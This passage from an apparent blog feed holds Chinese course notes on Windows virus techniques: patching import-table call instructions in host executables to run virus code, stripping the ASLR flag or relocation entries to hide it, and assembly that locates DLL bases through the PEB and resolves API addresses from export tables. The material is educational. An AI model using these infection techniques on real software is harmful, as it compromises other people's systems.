SEEK_CUR);</span><br><span class="line">        <span class="comment">//0x0040 随机加载 标识，用&amp;FFBF（即 1111 1111 1011 1111）将其去掉</span></span><br><span class="line"><span class="keyword">short</span> dllChar = ntHdrs.OptionalHeader.DllCharacteristics &amp; <span class="number">0xffbf</span>;</span><br><span class="line"><span class="comment">//写入新的属性值</span></span><br><span class="line">        fwrite(&amp;dllChar, <span class="keyword">sizeof</span>(dllChar), <span class="number">1</span>, fp); </span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure></li><li><p>去掉所对应的重定位项</p><blockquote><p>该方法不修改DLLCharacteristic，更加隐秘</p><p>重定位表就是.reloc节，为了避免删除带来影响，在reloc节尾部填充删除的字节数</p><p>算法：</p><ol><li><p>patch一条指令时，指令首部偏移2字节就是需要重定位的位置A</p></li><li><p>遍历reloc节查找RVA=A的项并删除</p><p>首先从reloc节内部的小表首部获取该页的加载基址的RVA为B，从后4字节获取小表大小C，共C-8（头8字节RVA和Size）/2（每项2字节）个项，遍历，每取一项的后1.5字节假定为D，如果B+D==A，删除，然后修改小表的Size值（减2），OptionalHeader数据目录中reloc项的size也减2，reloc节尾部填充2个字节</p></li></ol></blockquote></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;程序实现指令patch&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#程序实现指令patch&quot;&gt;&lt;/a&gt; 程序实现指令Patch&lt;/h2&gt;
&lt;h3 id=&quot;如何找到需要patch的指令&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#如何找到需要patch的指令&quot;&gt;&lt;/a&gt; 如何找到需要Patch的指令&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;首先指定一个会被大概率调用的函数名（也包括函数所在DLL的名字）&lt;/li&gt;
&lt;li&gt;然后通过被寄生文件（exe）的导入表找到该函数的导入表项的地址（即IAT中对应项的地址）&lt;/li&gt;
&lt;li&gt;最后去exe文件的代码中搜索所有可能的Call [xxxx]或JMP [xxxx]，进行Patch&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_指令Patch和导入表机制</title>
    <link href="https://wsw8.online/archives/3d101c50.html"/>
    <id>https://wsw8.online/archives/3d101c50.html</id>
    <published>2021-05-19T13:21:52.000Z</published>
    <updated>2021-05-20T11:19:15.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="patch的核心问题和解决思路"><a class="markdownIt-Anchor" href="#patch的核心问题和解决思路"></a> Patch的核心问题和解决思路</h2><h3 id="核心问题"><a class="markdownIt-Anchor" href="#核心问题"></a> 核心问题</h3><ol><li>找到一条指令，并知道其起始边界</li><li>最好这条指令必然执行，否则patch了，病毒代码也不会必然执行</li></ol><span id="more"></span><h3 id="解决思路"><a class="markdownIt-Anchor" href="#解决思路"></a> 解决思路</h3><ol><li>对一些常见特殊指令识别，比如push ebp；mov ebp，esp等，这是很多函数的开始，设定基址寄存器的组合。简单，方便。缺点：由于指令长度过短，可能和数据相同，因此不见得一定是指令；同时，不见得该代码一定会被执行</li><li>对导入函数的调用指令进行Patch，这些指令可信度很高，可以选择某些必然被调用的函数指令去patch</li><li>病毒自带反汇编器（如一些开源的反汇编器），静态分析宿主程序，随机找一条指令patch，隐蔽度极高，复杂，但patch的指令不一定会必然执行</li><li>自带调试功能（相当于一个调试器），将宿主程序隐藏启动，单步调试运行，自然得到每条指令的边界</li></ol><h2 id="对调用导入函数的指令patch"><a class="markdownIt-Anchor" href="#对调用导入函数的指令patch"></a> 对调用导入函数的指令patch</h2><h3 id="函数调用"><a class="markdownIt-Anchor" href="#函数调用"></a> 函数调用</h3><p>函数调用一般采用call+相对偏移<br />机器码：E8 xx xx xx xx，其中xx xx xx xx是目标地址相对call指令<strong>后面那条指令</strong>的偏移（类似JMP）</p><p>采用相对偏移好处：整个模块整体搬迁，偏移不变，不会出错<br />局限：相对偏移只能运用到同一模块中</p><p>为了跨模块调用，在编译器和系统的协助下引入<strong>导入表机制</strong></p><h3 id="导入表"><a class="markdownIt-Anchor" href="#导入表"></a> 导入表</h3><p>为每个被调用的DLL函数设定一个“邮箱”（导入表项），系统加载DLL后，利用导出表机制获得函数的地址，然后将函数地址放到各自的“邮箱”中，调某个函数就从邮箱拿地址，而如何将对应的函数放到对应的“邮箱”，就利用了导入表机制</p><p>图示：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%92%8C%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9C%BA%E5%88%B6/image-20210520092949171.png" alt="image-20210520092949171" /></p><h3 id="如何填写导入表"><a class="markdownIt-Anchor" href="#如何填写导入表"></a> 如何填写导入表</h3><p>在可选头的数据目录的第二项就是导入表的描述，其中有导入表的RVA，导入表每一项是一个IMAGE_IMPORT_DESCRIPTION结构，代表一个导入的DLL的相关信息，这个结构中还有INT表（Import Name Table）和IAT表（Import Address Table）的RVA和DLL名等</p><h4 id="int表"><a class="markdownIt-Anchor" href="#int表"></a> INT表</h4><p>加载前后，INT表内容不变，就是IAT加载前内容。INT可能不存在，但如果有地址预绑定，就必须有INT</p><h4 id="iat表"><a class="markdownIt-Anchor" href="#iat表"></a> IAT表</h4><p>必须，好比邮箱，编译后，IAT每项4个字节，是一个RVA，指向IMAGE_IMPORT_BY_NAME表中的一项，这一项就是对应函数的序号和函数名。加载后，IAT表的内容变为函数入口地址</p><h4 id="int与iat"><a class="markdownIt-Anchor" href="#int与iat"></a> INT与IAT</h4><p>一般情况下，INT（OriginalFirstThunk）和IAT（FirstThunk）内容相同，因此是冗余的，所以有的编译器不生成INT，RVA为0</p><h4 id="iat表初始化算法"><a class="markdownIt-Anchor" href="#iat表初始化算法"></a> IAT表初始化算法</h4><ol><li>从数据目录获得导入表入口，从入口开始，每项代表一个被引用的DLL，从其中DLL名RVA段可获得DLL名</li><li>系统遍历编译时生成的每个INT或IAT（有INT就判断INT，预先绑定只能遍历INT），第二项存储的是一个RVA，指向IMAGE_IMPORT_BY_NAME</li><li>找到该项，获得函数名串，以\0结尾，通过对应DLL的导出表找到相关函数的加载地址</li><li>然后将其放入IAT表的第二项（此时，IAT表的值才变为函数的加载地址）</li><li>如此遍历，将所有项都填入对应函数入口地址</li><li>遍历IMAGE_IMPORT_DESCRIPTION表，对所有DLL都做2~4步处理</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%92%8C%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9C%BA%E5%88%B6/image-20210520095154024.png" alt="image-20210520095154024" /></p><h3 id="预先绑定"><a class="markdownIt-Anchor" href="#预先绑定"></a> 预先绑定</h3><ol><li>由于程序在加载时需要在IAT表中填写函数的加载地址入口，因此比较耗时，所以有了预先绑定技术</li><li>预先绑定是在编译时向IAT表中填入导入地址（即函数的入口地址，不是指向IMAGE_IMPORT_BY_NAME表项的RVA），它是直接根据系统DLL的预期基址（ImageBase）计算出来的</li><li>通过预先绑定，在实际加载时，只要系统DLL的基址没变，那么IAT表的内容就不需要再次填充</li><li>所以要验证DLL是否被加载到预期地址，这时，不能使用IAT表指向IMAGE_IMPORT_BY_NAEM表项了，所以通过INT表再次执行导入表机制从而使得IAT表内容更新</li><li>这就是为什么如果使用预先绑定导入地址，必须有INT表</li><li>所以，只要INT存在，则用它检索IMAGE_IMPORT_BY_NAME，否则就用IAT表检索</li></ol><h3 id="patch感染"><a class="markdownIt-Anchor" href="#patch感染"></a> patch感染</h3><p>思路：将CALL [xxxx]或JMP [xxxx]指令修改替换指向我们的代码，选择大多数程序都会调用的函数，例如GetCommandLine（获取程序的命令行参数然后以参数的形式传递给WinMain函数）</p><p>细节：</p><ol><li><p>首先查找函数A的导入表想的地址xx xx xx xx（邮箱地址）</p></li><li><p>得到地址后查找代码节找到间接跳转指令</p><p>FF 15 xx xx xx xx（CALL [xx xx xx xx]）或FF 25 xx xx xx xx（JMP [xx xx xx xx]）</p></li><li><p>分别Patch为跳转病毒指令</p><p>E8 yy yy yy yy 90（CALL 偏移，NOP）或E9 yy yy yy yy（JMP偏移）</p></li><li><p>注意：CALL指令需要返回它的下一条指令，它有压栈和ret返回的操作，而JMP则没有，所以加90</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;patch的核心问题和解决思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#patch的核心问题和解决思路&quot;&gt;&lt;/a&gt; Patch的核心问题和解决思路&lt;/h2&gt;
&lt;h3 id=&quot;核心问题&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#核心问题&quot;&gt;&lt;/a&gt; 核心问题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;找到一条指令，并知道其起始边界&lt;/li&gt;
&lt;li&gt;最好这条指令必然执行，否则patch了，病毒代码也不会必然执行&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_DLL+导出表</title>
    <link href="https://wsw8.online/archives/227443dc.html"/>
    <id>https://wsw8.online/archives/227443dc.html</id>
    <published>2021-05-19T10:08:13.000Z</published>
    <updated>2021-05-19T13:20:15.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如何让病毒调用系统的api函数"><a class="markdownIt-Anchor" href="#如何让病毒调用系统的api函数"></a> 如何让病毒调用系统的API函数</h2><h3 id="如何获取api的入口地址"><a class="markdownIt-Anchor" href="#如何获取api的入口地址"></a> 如何获取API的入口地址</h3><ol><li>找到提供这个API函数的DLL的加载基址</li><li>从DLL的导出表中拿到API函数地址</li></ol><span id="more"></span><blockquote><p>DLL导出表机制：</p><p>在这个表中根据函数名找到函数入口地址</p></blockquote><p>一个简单方法：</p><blockquote><p>原理：一个系统中，所有进程加载的同一个DLL的加载基址是相同的</p></blockquote><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519193440959.png" alt="image-20210519193440959" /></p><p>病毒代码的处理：</p><ol><li><p>在病毒的数据区添加3个字段，分别存储MessageBox的地址（4字节）、函数参数“test”（5字节，留一个字节给结尾‘\0’字节）和“hello”（6字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">      ;MessageBox Entry <span class="number">4</span> bytes，偏移为<span class="number">13</span>字节（之前数据区<span class="number">13</span>字节）</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">;hello串，要留一个字节给结尾<span class="number">0</span>字节，共<span class="number">6</span>字节，偏移为<span class="number">17</span>字节</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">nop;</span><br><span class="line">;test串，要留一个字节给结尾<span class="number">0</span>字节，偏移为<span class="number">23</span>字节</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br></pre></td></tr></table></figure></li><li><p>获取MessageBox的地址，将函数地址和函数参数填入数据区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填写MessageBox的入口地址</span></span><br><span class="line"><span class="comment">//该数据在数据区偏移13字节处</span></span><br><span class="line">*(<span class="keyword">void</span> **)(virusData + <span class="number">13</span>) = MessageBox;</span><br><span class="line"><span class="comment">//填写参数，hello字符串</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">17</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//填写参数，test字符串</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">23</span>, <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>在真正寄生的病毒代码中调用MessageBox函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">call yy;</span><br><span class="line">数据区;</span><br><span class="line">yy: pop eax; <span class="comment">//eax为数据区的实际起始内存地址</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">//调用MessageBox</span></span><br><span class="line">push <span class="number">0</span>; <span class="comment">//传递最后一个参数</span></span><br><span class="line">mov ebx, eax;  <span class="comment">//ebx指向数据区起始内存地址</span></span><br><span class="line">add ebx, <span class="number">23</span>; <span class="comment">//ebx指向test串</span></span><br><span class="line">push ebx;   <span class="comment">//压栈，传参test</span></span><br><span class="line">sub ebx, <span class="number">6</span>; <span class="comment">//hello串在test串前6个字节</span></span><br><span class="line">push ebx;  <span class="comment">//压栈,传参hello串</span></span><br><span class="line">push <span class="number">0</span>;   <span class="comment">//传递最后一个参数</span></span><br><span class="line">add eax, <span class="number">13</span>;  <span class="comment">//MessageBox地址在数据区偏移13个字节处</span></span><br><span class="line">mov eax, [eax]; <span class="comment">//获取MessageBox的地址</span></span><br><span class="line">call eax;  <span class="comment">//调用MessageBox函数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure></li></ol><h3 id="如何判断是否是控制台程序"><a class="markdownIt-Anchor" href="#如何判断是否是控制台程序"></a> 如何判断是否是控制台程序</h3><p>在PE文件可选映像头中，字段subsystem描述了该属性</p><p>Windows GUI和Windows CUI （G——Graphic，C——Console）</p><h2 id="病毒真正获取api函数地址的方法"><a class="markdownIt-Anchor" href="#病毒真正获取api函数地址的方法"></a> 病毒真正获取API函数地址的方法</h2><h3 id="获取dll基址"><a class="markdownIt-Anchor" href="#获取dll基址"></a> 获取DLL基址</h3><ol><li>FS寄存器在偏移0x30处保存了一个指针，指向PEB结构</li><li>PEB结构的偏移0x0c处保存了另外一个指针，指向PEB_LDR_DATA结构</li><li>PEB_LDR_DATA偏移0c处是加载模块链表的头指针，8个字节，头4个字节指向LDR_MODULE结构体（代表一个模块，每个模块都对应一个这样的结构体），后4个字节指向下一个结构体组成链表，该链表是循环链表</li><li>LDR_MODULE偏移0x2c有个成员BaseDllName，8个字节，后4个字节为地址，指向纯模块名的unicode串</li></ol><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//s1为要查找的DLL名，不包含结束符，Unicode码，一个字符占2个字节，所以是push 18</span></span><br><span class="line"><span class="comment">//相关代码在win7下可用 </span></span><br><span class="line">OLECHAR * s1 = <span class="string">L&quot;ntdll.dll&quot;</span>;</span><br><span class="line">    _asm&#123;</span><br><span class="line">       push <span class="number">18</span>      <span class="comment">//传参，字符串长度</span></span><br><span class="line">       push s1      <span class="comment">//传参，DLL名字</span></span><br><span class="line">       call finddll  <span class="comment">//调用函数finddll</span></span><br><span class="line">       jmp end</span><br><span class="line">       finddll:      <span class="comment">//finddll函数：找到DLL，返回eax为基址；否则为0</span></span><br><span class="line">       ……</span><br><span class="line">       end:</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * p;</span><br><span class="line">_asm mov p, eax</span><br><span class="line">wprintf(L“the dll %s base is %x\n”, s1, p);  <span class="comment">//打印DLL基址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">finddll:   ;参数<span class="number">1</span>为DLL的名字，参数<span class="number">2</span>位DLL长度，返回EAX为DLL基址或<span class="number">0</span>（未找到）</span><br><span class="line">   mov  ebx, fs:[<span class="number">30</span>h]      ;定位PEB</span><br><span class="line">   mov  ebx, [ebx+<span class="number">0</span>ch];定位PEB_LDR</span><br><span class="line">   mov  ebx, [ebx+<span class="number">0</span>ch];定位第一个模块（MODULE）</span><br><span class="line">   push ebx ;保存第一个模块地址到栈上</span><br><span class="line">loop_finddll:</span><br><span class="line">   push [esp + <span class="number">12</span>]  ;把DLL长度传参</span><br><span class="line">   push [esp + <span class="number">12</span>]  ;把DLL名字传参</span><br><span class="line">   push [ebx + <span class="number">30</span>h] ;传参<span class="keyword">module</span>的BaseName</span><br><span class="line">   call strcompare ;比较BaseName和s1是否相等</span><br><span class="line">   test eax,eax ;返回eax，<span class="number">0</span>为假，<span class="number">1</span>为真</span><br><span class="line">   jnz found ;找到跳转，未找到继续遍历</span><br><span class="line">   mov ebx,[ebx];模块头<span class="number">4</span>个字节指向下一个模块</span><br><span class="line">   mov eax,[ebx];指向当前模块的下下个模块</span><br><span class="line">   cmp [esp],eax;判断下下个模块是否是头模块</span><br><span class="line">   jz not_found ;遍历完说明没找到DLL  </span><br><span class="line">   jmp loop_finddll ;没遍历完，继续查找下一个模块</span><br><span class="line">found:</span><br><span class="line">   mov eax,[ebx+<span class="number">18</span>h];找到了，在模块偏移<span class="number">18</span>拿基地址，放eax</span><br><span class="line">   jmp finddll_end</span><br><span class="line">not_found:</span><br><span class="line">   <span class="keyword">xor</span> eax, eax ;没找到DLL，finddll函数返回eax为<span class="number">0</span></span><br><span class="line">finddll_end:</span><br><span class="line">   pop ebx ;平衡栈</span><br><span class="line">   ret <span class="number">8</span> ;平衡栈</span><br><span class="line"></span><br><span class="line">       strcompare: ;参数<span class="number">1</span> 字符串<span class="number">1</span>, 参数<span class="number">2</span> 字符串<span class="number">2</span>, 参数<span class="number">3</span> 字符串长度</span><br><span class="line">            ;返回eax，为<span class="number">0</span>表示不相等，为<span class="number">1</span>表示相等</span><br><span class="line">   push esi</span><br><span class="line">   push edi</span><br><span class="line">   push ecx</span><br><span class="line">   mov esi, [esp + <span class="number">16</span>]  ;获得参数<span class="number">1</span></span><br><span class="line">   mov edi, [esp + <span class="number">20</span>]  ;获得参数<span class="number">2</span></span><br><span class="line">   mov ecx, [esp + <span class="number">24</span>]  ;获得参数<span class="number">3</span></span><br><span class="line">   <span class="keyword">xor</span> eax, eax  ;返回值eax设初值<span class="number">0</span></span><br><span class="line">   cld        ;设置比较方向为地址增长方向</span><br><span class="line">   repz cmpsb        ;如果ecx为<span class="number">0</span>或比较的字节不相同则退出循环</span><br><span class="line">   test ecx,ecx</span><br><span class="line">   jnz strnotequ     ;如果ecx不为<span class="number">0</span>，说明比较字符不等，没比较完嘛</span><br><span class="line">   inc eax    ;找到了，设置返回值eax为<span class="number">1</span>，否则，不执行本语句，为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">strnotequ:   </span><br><span class="line">   pop ecx</span><br><span class="line">   pop edi</span><br><span class="line">   pop esi</span><br><span class="line">   ret <span class="number">0</span>ch    ;平衡栈，传递了<span class="number">3</span>个参数</span><br></pre></td></tr></table></figure><h3 id="获取dll中的函数地址"><a class="markdownIt-Anchor" href="#获取dll中的函数地址"></a> 获取DLL中的函数地址</h3><p>DLL对外暴露自己的函数的方式：</p><ol><li>函数名</li><li>序号</li></ol><blockquote><p>注：函数名和序号并非一一对应</p></blockquote><h4 id="序号查找"><a class="markdownIt-Anchor" href="#序号查找"></a> 序号查找</h4><p>好处：快、高效</p><p>不足：不够直观，不够稳定</p><p>做法：用一个数组存放函数的入口地址，这样存放和读取都方便，从n开始就做一个减法</p><h4 id="函数名查找"><a class="markdownIt-Anchor" href="#函数名查找"></a> 函数名查找</h4><p>好处：直观，具体</p><p>做法：让函数名表和函数地址表的索引一一对应</p><p>不足：有的函数名不暴露出来，会导致函数名表和函数地址表的索引不一致</p><p>解决方法：增加一个表描述对应关系，如图</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519203923430.png" alt="image-20210519203923430" /></p><h3 id="导出表的关键信息汇总"><a class="markdownIt-Anchor" href="#导出表的关键信息汇总"></a> 导出表的关键信息汇总</h3><ol><li>序号查找需要知道序号的最小值n，利用他可以直接计算函数地址表的索引</li><li>函数名表：函数名的字串表，每个名字以\0结尾</li><li>函数名表的元素个数X</li><li>函数地址索引表：元素个数就是函数名表的个数X，函数名表的第x项对应函数地址索引表的x项，其中存储的是该函数在函数地址表中的索引值</li><li>由函数名查找的方法是：找到函数名在函数名表的索引x，然后读函数地址索引表的第x项，假设该项的值为y，那么就在函数地址表的第y项拿到函数地址</li><li>函数地址表：存储的是函数的入口地址，不论用序号还是名字导出的函数，相应的函数地址都存在其中，函数地址表是按序号增序排列。序号和函数地址表索引的对应关系是：i = 序号 - n（最小序号）</li></ol><h3 id="pe格式中导出表的信息"><a class="markdownIt-Anchor" href="#pe格式中导出表的信息"></a> PE格式中导出表的信息</h3><p>在模块可选头中有个数据目录表，其中每项包括导出表、导入表、重定位表等；在导出表头中有如下信息：</p><ol><li>Address Table RVA就是函数地址表的RVA</li><li>Ordinal Table RVA就是函数地址索引表的RVA，PE格式叫它序号表</li><li>Ordinal Base就是最小的序号</li><li>Number of names就是函数名表的条数</li><li>Name Pointer Table RVA是函数名指针表，每项4个字节，存放一个RVA，指向一个函数名的字符串</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/image-20210519205042946.png" alt="image-20210519205042946" /></p><h3 id="导出函数查找算法总结"><a class="markdownIt-Anchor" href="#导出函数查找算法总结"></a> 导出函数查找算法总结</h3><ol><li><p>从DLL加载的实际基址获取可选头，从其中数据目录表的第一项找到导出表入口RVA</p></li><li><p>从导出表的表头获取Number of names，即查找的最大循环次数</p></li><li><p>循环遍历函数名指针表，比对每项RVA指向的字串是否为要找的函数名</p></li><li><p>如果找到，记下此时函数名指针表项的索引，设为 i</p></li><li><p>根据索引 i，在序号表中找到对应项，获取其内容为n</p></li><li><p>以n为索引在函数地址表中找到函数入口的RVA，加上DLL的实际基址即为函数的实际入口地址</p></li><li><blockquote><p>注：以上算法中，所有访问实际地址的地方，就用DLL的实际加载基址+RVA即可</p></blockquote></li></ol><h3 id="程序设计查找dll中的函数地址"><a class="markdownIt-Anchor" href="#程序设计查找dll中的函数地址"></a> 程序设计——查找DLL中的函数地址</h3><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为各个所需的偏移量定义宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NTHDR_START_IN_DOSHDR 0x3c  <span class="comment">//DOS头偏移0x3c为NT头的偏移</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NTHDR_EXPORT_DIR 0x78  <span class="comment">//NT头偏移0x78为导出表的RVA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NAME_NUM_EXPORT 0X18   <span class="comment">//导出表偏移0x18为函数名的数量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_NAME_PTR_EXPORT 0X20   <span class="comment">//导出表偏移0x20为函数名指针表RVA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_ORDINAL_EXPORT 0X24    <span class="comment">//导出表偏移0x24为序号表RVA</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET_PROC_PTR_EXPORT 0x1c   <span class="comment">//导出表偏移0x1C为函数地址表RVA</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数需要3个参数，DLL基址，函数名，函数名长度，注意传参是从右向左压栈</span></span><br><span class="line">__declspec(naked) _stdcall <span class="keyword">unsigned</span> <span class="keyword">long</span> </span><br><span class="line">           getProcEntry(<span class="keyword">char</span> * base, <span class="keyword">char</span> * procName, <span class="keyword">int</span> procNameLen) &#123; </span><br><span class="line">  _asm</span><br><span class="line"> &#123;</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    mov edi, [ebp + <span class="number">8</span>]; <span class="comment">//edi存放DLL基址（base）</span></span><br><span class="line">    mov ebx, edi         </span><br><span class="line">    add ebx, OFFSET_NTHDR_START_IN_DOSHDR; <span class="comment">//ebx: 